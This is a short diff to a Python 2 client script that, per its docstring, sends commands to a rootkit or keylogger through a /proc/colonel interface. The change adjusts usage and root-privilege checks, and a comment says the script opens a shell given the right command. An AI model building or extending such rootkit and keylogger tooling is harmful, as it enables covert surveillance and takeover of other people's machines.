@@ -33,7 +33,9 @@ def keylogs():
 
 def main():
 	""" Sends commands to the rootkit or keylogger via /proc/colonel. """
-	if len(sys.argv[:]) <= 1 or os.geteuid() != 0:
+	if len(sys.argv[:]) <= 1:
+		print "usage: %s <command>" % sys.argv[0]
+	elif os.geteuid() != 0 and "keylog" == sys.argv[1]:
 		print "usage: sudo %s <command>" % sys.argv[0]
 	# will open a shell given the correct command.
 	elif len(sys.argv[:]) > 2:
